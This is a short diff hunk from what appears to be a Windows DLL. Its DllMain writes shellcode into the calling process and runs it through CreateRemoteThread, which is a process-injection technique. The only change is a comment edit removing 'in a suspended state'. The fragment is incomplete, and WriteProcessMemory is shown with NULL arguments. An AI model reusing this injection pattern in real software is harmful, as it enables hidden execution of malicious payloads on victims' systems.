@@ -49,7 +49,7 @@ BOOL APIENTRY DllMain(
         // Write the shellcode into the memory of the calling process
         WriteProcessMemory(callingProc, remoteBuf, NULL, NULL, NULL);
 
-        // Create a remote thread on the calling process, in a suspended state
+        // Create a remote thread on the calling process
         HANDLE remoteThread = CreateRemoteThread(callingProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuf, NULL, CREATE_SUSPENDED, 0);
 
         // Resume the remote thread
